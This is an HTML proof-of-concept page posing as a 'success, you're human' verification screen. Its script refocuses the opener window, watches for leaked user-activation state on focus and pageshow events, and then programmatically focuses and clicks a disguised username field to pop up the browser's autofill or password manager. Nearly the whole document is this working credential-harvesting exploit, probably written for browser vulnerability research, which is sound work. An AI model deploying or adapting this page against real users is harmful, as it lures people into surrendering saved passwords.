<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>PoC - Target Page (Vulnerable Origin)</title>
</head>

<body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
    <h1>success, you're human</h1>

    <div
        style="margin-top: 20px; background: white; padding: 20px; border-radius: 8px; display: inline-block; border: 1px solid #ccc;">
        <p style="font-size: 12px; color: #666;">Security Verification Field (Hidden Payload)</p>
        <input type="text" id="fake-user" name="username" autocomplete="username" placeholder="Username"
            style="display: block; margin: 10px auto; padding: 10px;">
        <input type="password" id="fake-pass" name="password" autocomplete="current-password" placeholder="Password"
            style="display: block; margin: 10px auto; padding: 10px;">
    </div>

    <script>
        if (window.opener) {
            setTimeout(() => {
                window.opener.focus();
            }, 500);
        }

        let triggered = false;

        function checkAndExploit(triggerSource) {
            const isActive = navigator.userActivation.isActive;
            const userInput = document.getElementById('fake-user');

            console.log(`[${triggerSource}] Activation state:`, isActive);

            if (isActive && !triggered) {
                triggered = true;
                console.log("[!] Activation leak detected. Triggering Autofill...");
                userInput.focus();
                userInput.click();

                console.log("[!!!] Autofill / Password Manager should be visible now.");
                setTimeout(() => { triggered = false; }, 2000);
            }
        }

        window.addEventListener("focus", () => checkAndExploit("focus"));
        window.addEventListener("pageshow", () => checkAndExploit("pageshow"));
    </script>
</body>

</html>
